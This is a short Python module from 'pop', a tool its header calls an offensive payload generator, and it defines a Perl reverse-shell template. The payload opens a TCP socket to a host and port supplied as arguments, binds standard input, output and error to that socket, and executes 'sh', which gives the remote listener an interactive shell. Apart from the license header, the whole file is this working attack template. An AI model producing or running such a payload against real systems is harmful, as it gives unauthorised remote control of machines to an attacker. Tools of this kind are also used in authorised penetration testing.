#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

USAGE = 'host port'
NARGS = [2, 2]
LANG = 'pl'
EXEC = '''
perl -e "PAYLOAD"
'''


# FIXME PF_INET=2
# FIXME SOCK_STREAM=1
pl = '''
use Socket;socket(VAR0,PF_INET,SOCK_STREAM,6);if(connect(VAR0,sockaddr_in(ARG2,inet_aton('ARG1')))){open(STDIN,'>&VAR0');open(STDOUT,'>&VAR0');open(STDERR,'>&VAR0');exec('sh');};
'''
